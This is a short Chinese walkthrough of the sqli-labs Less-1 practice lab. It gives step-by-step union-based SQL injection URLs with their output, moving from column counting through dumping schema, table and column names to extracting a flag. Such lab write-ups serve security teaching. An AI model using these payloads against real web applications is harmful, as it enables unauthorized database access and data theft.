# 原创
：  less-1 in sqli-labs

# less-1 in sqli-labs

### Less-1 联合查询[ ’ ]

**查看返回了多少列**

```
http://sqli-labs:8080/Less-1/?id=1%27%20order%20by%204%20--+
Unknown column '4' in 'order clause'

http://sqli-labs:8080/Less-1/?id=1%27%20order%20by%203%20--+
Your Login name:Dumb
Your Password:Dumb

# 返回3列

```

**查看显位**

```
http://sqli-labs:8080/Less-1/?id=0%27%20union%20select%20database(),version(),database()%20--+
Your Login name:5.7.26
Your Password:security

#显位为2,3位

```

**爆库名**

```
http://sqli-labs:8080/Less-1/?id=0%27%20union%20select%201,database(),group_concat(schema_name)%20from%20information_schema.schemata%20--+
Your Login name:security
Your Password:information_schema,challenges,mysql,performance_schema,security,sys,test

```

**爆表名**

```
http://sqli-labs:8080/Less-1/?id=0%27%20union%20select%201,database(),(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())%20--+
Your Login name:security
Your Password:emails,hermesflag,referers,uagents,users

```

**爆列名**

```
http://sqli-labs:8080/Less-1/?id=0%27%20union%20select%201,database(),(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27hermesflag%27)%20--+
Your Login name:security
Your Password:Id,flag

```

**爆数据**

```
http://sqli-labs:8080/Less-1/?id=0%27%20union%20select%201,database(),(select%20group_concat(concat(id,0x7e,flag))%20from%20hermesflag)%20--+
Your Login name:security
Your Password:1~flag{327a6c4304ad5938eaf0efb6cc3e53dc}

```
